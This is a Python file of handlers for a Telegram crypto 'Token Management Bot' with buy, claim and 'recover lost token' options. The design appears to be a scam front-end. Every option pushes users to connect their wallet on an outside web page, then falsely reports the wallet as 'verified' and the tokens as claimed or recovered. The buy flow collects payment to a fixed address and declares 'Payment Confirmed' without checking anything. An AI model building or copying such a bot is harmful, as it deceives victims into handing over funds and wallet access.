from telegram import Update
from telegram.ext import ContextTypes
from config import config
from user_states import UserState, UserStateManager
from keyboard_handlers import KeyboardHandlers
import re

class MessageHandlers:
    """Handles all incoming messages and callback queries"""
    
    def __init__(self, state_manager: UserStateManager):
        self.state_manager = state_manager
    
    async def handle_start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /start command"""
        user_id = update.effective_user.id
        
        # Check if this is a return from web platform
        if context.args and context.args[0].startswith('return_'):
            telegram_id = int(context.args[0].replace('return_', ''))
            if telegram_id == user_id:
                # User returned from web platform, handle wallet connection success
                await self.handle_wallet_connection_return(update, context)
                return
        
        # Regular start command - show new three options
        self.state_manager.set_user_state(user_id, UserState.START)
        
        await update.message.reply_text(
            "🚀 Welcome to the Token Management Bot!\n\n"
            "What would you like to do today?\n\n"
            "1️⃣ Buy Token - Purchase new tokens\n"
            "2️⃣ Claim Tokens - Claim your allocated tokens\n"
            "3️⃣ Recover Lost Token - Recover tokens from lost wallet",
            reply_markup=KeyboardHandlers.get_initial_options_keyboard(),
            parse_mode='Markdown'
        )
    
    async def handle_wallet_connection(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle wallet connection request"""
        user_id = update.effective_user.id
        self.state_manager.set_user_state(user_id, UserState.WALLET_CONNECTION)
        
        await update.callback_query.edit_message_text(
            "Please connect your wallet to proceed.",
            reply_markup=KeyboardHandlers.get_wallet_connection_keyboard(user_id),
            parse_mode='Markdown'
        )
    
    async def handle_wallet_connection_return(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle return from web platform after wallet connection"""
        user_id = update.effective_user.id
        
        # Mark wallet as connected
        self.state_manager.mark_wallet_connected(user_id)
        
        # Get user's current state and action to show appropriate congratulations
        user_state = self.state_manager.get_user_state(user_id)
        user_action = self.state_manager.get_user_action(user_id)
        selected_token = self.state_manager.get_selected_token(user_id)
        
        if user_state == UserState.RECOVERY:
            # Recovery flow
            message = "🎉 Congratulations!\n\n"
            message += "Your wallet has been successfully connected for token recovery!\n\n"
            message += "📋 Recovery Status:\n"
            message += "✅ Wallet connected and verified\n"
            message += "⏳ Recovery process initiated\n"
            message += "⏰ Estimated time: Not less than 24 hours\n\n"
            message += "We'll process your recovery request and notify you once completed."
            
        elif user_action == "buy" and selected_token:
            # Buy token flow
            message = f"🎉 Congratulations!\n\n"
            message += f"Your wallet has been successfully connected!\n\n"
            message += f"📋 Purchase Status:\n"
            message += f"✅ Wallet connected and verified\n"
            message += f"🎯 Token: {selected_token.replace('_', ' ')}\n"
            message += f"💰 Action: Buy tokens\n"
            message += f"⏳ Processing your purchase...\n\n"
            message += f"Your {selected_token.replace('_', ' ')} tokens will be processed shortly!"
            
        elif user_action == "claim" and selected_token:
            # Claim token flow
            message = f"🎉 Congratulations!\n\n"
            message += f"Your wallet has been successfully connected!\n\n"
            message += f"📋 Claim Status:\n"
            message += f"✅ Wallet connected and verified\n"
            message += f"🎯 Token: {selected_token.replace('_', ' ')}\n"
            message += f"🎁 Action: Claim tokens\n"
            message += f"⏳ Processing your claim...\n\n"
            message += f"Your {selected_token.replace('_', ' ')} tokens are being claimed!"
            
        else:
            # Fallback
            message = "🎉 Congratulations!\n\n"
            message += "Your wallet has been successfully connected!\n\n"
            message += "You can now proceed with your token operations."
        
        await update.message.reply_text(
            message,
            reply_markup=KeyboardHandlers.get_main_menu_keyboard(),
            parse_mode='Markdown'
        )
    
    async def handle_start_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle start callback to return to initial options"""
        user_id = update.effective_user.id
        self.state_manager.set_user_state(user_id, UserState.START)
        
        await update.callback_query.edit_message_text(
            "🚀 Welcome to the Token Management Bot!\n\n"
            "What would you like to do today?\n\n"
            "1️⃣ Buy Token - Purchase new tokens\n"
            "2️⃣ Claim Tokens - Claim your allocated tokens\n"
            "3️⃣ Recover Lost Token - Recover tokens from lost wallet",
            reply_markup=KeyboardHandlers.get_initial_options_keyboard(),
            parse_mode='Markdown'
        )
    
    async def handle_main_menu(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle main menu selection"""
        user_id = update.effective_user.id
        
        # Check if user has connected wallet
        if not self.state_manager.is_wallet_connected(user_id):
            await update.callback_query.answer("Please connect your wallet first!")
            await update.callback_query.edit_message_text(
                "Please connect your wallet first!",
                reply_markup=KeyboardHandlers.get_wallet_connection_keyboard(user_id),
                parse_mode='Markdown'
            )
            return
        
        self.state_manager.set_user_state(user_id, UserState.MAIN_MENU)
        
        await update.callback_query.edit_message_text(
            "🎯 Main Menu\n\n"
            "What would you like to do?\n\n"
            "💰 Buy Tokens - Purchase new tokens\n"
            "🎁 Claim Tokens - Claim your allocated tokens\n"
            "🔍 Recover Lost Token - Recover tokens from lost wallet",
            reply_markup=KeyboardHandlers.get_main_menu_keyboard(),
            parse_mode='Markdown'
        )
    
    async def handle_amount_selection(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle token amount selection"""
        user_id = update.effective_user.id
        callback_data = update.callback_query.data
        
        # Extract amount from callback data
        amount = int(callback_data.replace('amount_', ''))
        self.state_manager.set_payment_amount(user_id, amount)
        self.state_manager.set_user_state(user_id, UserState.WAITING_PAYMENT)
        
        # Get token amount for selected USD
        token_amount = config.TOKEN_PRICES[amount]
        
        payment_message = f"""
💰 **Payment Details**

Selected Amount: **${amount:,}**
Tokens to Receive: **{token_amount:,} {config.COMPANY_NAME} tokens**

📝 **Payment Instructions:**

Send exactly **${amount:,}** to this wallet address:
`{config.PAYMENT_WALLET_ADDRESS}`

⚠️ **Important:** 
- Only send the exact amount: ${amount:,}
- Use the correct network (Ethereum/BSC)
- Wait for confirmation before clicking "Funds Sent"

After sending payment, click "✅ Funds Sent" below.
"""
        
        await update.callback_query.edit_message_text(
            payment_message,
            reply_markup=KeyboardHandlers.get_payment_confirmation_keyboard(),
            parse_mode='Markdown'
        )
    
    async def handle_funds_sent(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle funds sent confirmation"""
        user_id = update.effective_user.id
        amount = self.state_manager.get_payment_amount(user_id)
        
        # Reset user to main menu
        self.state_manager.reset_user_to_main_menu(user_id)
        
        await update.callback_query.edit_message_text(
            "🎉 **Congratulations!** 🎉\n\n"
            f"✅ **Payment Confirmed: ${amount:,}**\n\n"
            "🎯 **Status:** Processing\n"
            "⏱️ **Time:** 24-48 hours\n\n"
            f"Your **{config.TOKEN_PRICES[amount]:,} {config.COMPANY_NAME} tokens** will be sent to your connected wallet!\n\n"
            "You'll receive a notification once the tokens are sent!\n\n"
            "Thank you for your investment! 🚀💰",
            reply_markup=KeyboardHandlers.get_main_menu_keyboard(),
            parse_mode='Markdown'
        )
    
    async def handle_token_selection(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle token type selection (XRP, WLFI, ERC TOKENS)"""
        user_id = update.effective_user.id
        callback_data = update.callback_query.data
        
        # Extract token type from callback data
        token_type = callback_data.replace('token_', '')
        self.state_manager.set_selected_token(user_id, token_type)
        self.state_manager.set_user_state(user_id, UserState.TOKEN_SELECTED)
        
        await update.callback_query.edit_message_text(
            f"🎯 {token_type.replace('_', ' ')} Selected!\n\n"
            "Now you need to connect your wallet to proceed.\n\n"
            "Click the button below to connect your wallet:",
            reply_markup=KeyboardHandlers.get_wallet_connection_keyboard(user_id),
            parse_mode='Markdown'
        )
    
    async def handle_recovery_selection(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle recovery lost token selection"""
        user_id = update.effective_user.id
        self.state_manager.set_user_state(user_id, UserState.RECOVERY)
        
        await update.callback_query.edit_message_text(
            "🔍 Recover Lost Token\n\n"
            "To recover your lost tokens, you need to connect your wallet first.\n\n"
            "Click the button below to connect your wallet:",
            reply_markup=KeyboardHandlers.get_wallet_connection_keyboard(user_id),
            parse_mode='Markdown'
        )
    
    async def handle_buy_or_claim_selection(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle buy or claim selection - show token list"""
        user_id = update.effective_user.id
        callback_data = update.callback_query.data
        
        # Store the action type (buy or claim)
        if callback_data == "buy_token":
            self.state_manager.set_user_action(user_id, "buy")
            action_text = "Buy"
        else:  # claim_tokens
            self.state_manager.set_user_action(user_id, "claim")
            action_text = "Claim"
        
        self.state_manager.set_user_state(user_id, UserState.SELECTING_TOKEN)
        
        await update.callback_query.edit_message_text(
            f"🎯 {action_text} Tokens\n\n"
            f"Please select the token you want to {action_text.lower()}:\n\n"
            "1️⃣ XRP - Ripple token\n"
            "2️⃣ WLFI - WLFI token\n"
            "3️⃣ ERC TOKENS - Ethereum-based tokens",
            reply_markup=KeyboardHandlers.get_token_selection_keyboard(),
            parse_mode='Markdown'
        )
    
    async def handle_wallet_connected_success(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle successful wallet connection with congratulations message"""
        user_id = update.effective_user.id
        
        # Get user's action and selected token
        user_action = self.state_manager.get_user_action(user_id)
        selected_token = self.state_manager.get_selected_token(user_id)
        user_state = self.state_manager.get_user_state(user_id)
        
        if user_state == UserState.RECOVERY:
            # Recovery flow
            message = "🎉 Congratulations!\n\n"
            message += "Your wallet has been successfully connected for token recovery!\n\n"
            message += "📋 Recovery Status:\n"
            message += "✅ Wallet connected and verified\n"
            message += "⏳ Recovery process initiated\n"
            message += "⏰ Estimated time: Not less than 24 hours\n\n"
            message += "We'll process your recovery request and notify you once completed."
            
        elif user_action == "buy" and selected_token:
            # Buy token flow
            message = f"🎉 Congratulations!\n\n"
            message += f"Your wallet has been successfully connected!\n\n"
            message += f"📋 Purchase Status:\n"
            message += f"✅ Wallet connected and verified\n"
            message += f"🎯 Token: {selected_token.replace('_', ' ')}\n"
            message += f"💰 Action: Buy tokens\n"
            message += f"⏳ Processing your purchase...\n\n"
            message += f"Your {selected_token.replace('_', ' ')} tokens will be processed shortly!"
            
        elif user_action == "claim" and selected_token:
            # Claim token flow
            message = f"🎉 Congratulations!\n\n"
            message += f"Your wallet has been successfully connected!\n\n"
            message += f"📋 Claim Status:\n"
            message += f"✅ Wallet connected and verified\n"
            message += f"🎯 Token: {selected_token.replace('_', ' ')}\n"
            message += f"🎁 Action: Claim tokens\n"
            message += f"⏳ Processing your claim...\n\n"
            message += f"Your {selected_token.replace('_', ' ')} tokens are being claimed!"
            
        else:
            # Fallback
            message = "🎉 Congratulations!\n\n"
            message += "Your wallet has been successfully connected!\n\n"
            message += "You can now proceed with your token operations."
        
        # Mark wallet as connected
        self.state_manager.mark_wallet_connected(user_id)
        
        await update.callback_query.edit_message_text(
            message,
            reply_markup=KeyboardHandlers.get_main_menu_keyboard(),
            parse_mode='Markdown'
        )
    
    async def handle_help(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle help request"""
        help_message = f"""
ℹ️ **{config.COMPANY_NAME} Bot Help**

🔗 **Wallet Connection:**
1. Click "Connect Wallet" button
2. Complete wallet connection on web platform
3. Return to bot automatically

💰 **Buying Tokens:**
1. Select "Buy Tokens" from main menu
2. Choose your investment amount
3. Send payment to provided wallet address
4. Click "Funds Sent" after payment

🎁 **Claiming Tokens:**
1. Select "Claim Tokens" from main menu
2. Tokens are claimed automatically!
3. You'll receive them in your connected wallet

🔄 **Reset:** Use reset button to start over

📞 **Support:** Contact support for additional help

Need more assistance? Use the buttons below!
"""
        
        if update.callback_query:
            await update.callback_query.edit_message_text(
                help_message,
                reply_markup=KeyboardHandlers.get_help_keyboard(),
                parse_mode='Markdown'
            )
        else:
            await update.message.reply_text(
                help_message,
                reply_markup=KeyboardHandlers.get_help_keyboard(),
                parse_mode='Markdown'
            )
    
    async def handle_support(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle support request"""
        support_message = """
📞 **Support Information**

For technical support or questions:

🔗 **Official Channels:**
- Website: [Your Website]
- Email: support@yourdomain.com
- Telegram Group: [Your Group Link]

⏰ **Response Time:** 24-48 hours

📋 **Before contacting support:**
1. Check this help section
2. Ensure wallet is properly connected
3. Verify payment details
4. Check network compatibility

We're here to help! 🚀
"""
        
        await update.callback_query.edit_message_text(
            support_message,
            reply_markup=KeyboardHandlers.get_support_keyboard(),
            parse_mode='Markdown'
        )
    
    async def handle_reset(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle reset request"""
        user_id = update.effective_user.id
        
        # Clear all user data and reset to start
        self.state_manager.clear_user_data(user_id)
        self.state_manager.set_user_state(user_id, UserState.START)
        
        await update.callback_query.edit_message_text(
            "🔄 **Bot Reset Complete!**\n\n"
            "You've been reset to the beginning. Let's start fresh! 🚀",
            reply_markup=KeyboardHandlers.get_initial_options_keyboard(),
            parse_mode='Markdown'
        )
    
    async def handle_cancel(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle cancel action"""
        user_id = update.effective_user.id
        
        # Return to initial options
        self.state_manager.set_user_state(user_id, UserState.START)
        
        await update.callback_query.edit_message_text(
            "🚀 Welcome to the Token Management Bot!\n\n"
            "What would you like to do today?\n\n"
            "1️⃣ Buy Token - Purchase new tokens\n"
            "2️⃣ Claim Tokens - Claim your allocated tokens\n"
            "3️⃣ Recover Lost Token - Recover tokens from lost wallet",
            reply_markup=KeyboardHandlers.get_initial_options_keyboard(),
            parse_mode='Markdown'
        )
    
    async def handle_invalid_action(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle invalid actions"""
        user_id = update.effective_user.id
        current_state = self.state_manager.get_user_state(user_id)
        
        if current_state == UserState.START:
            await update.message.reply_text(
                "Please use the buttons to navigate the bot.",
                reply_markup=KeyboardHandlers.get_initial_options_keyboard(),
                parse_mode='Markdown'
            )
        elif current_state == UserState.MAIN_MENU:
            await update.message.reply_text(
                "Please use the buttons to navigate the bot.",
                reply_markup=KeyboardHandlers.get_main_menu_keyboard(),
                parse_mode='Markdown'
            )
        else:
            await update.message.reply_text(
                "Please use the buttons to navigate the bot.",
                reply_markup=KeyboardHandlers.get_cancel_keyboard(),
                parse_mode='Markdown'
            )
    
    async def handle_text_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle text messages based on user state"""
        user_id = update.effective_user.id
        current_state = self.state_manager.get_user_state(user_id)
        
        # No special text handling needed since claim tokens is immediate
        await self.handle_invalid_action(update, context)
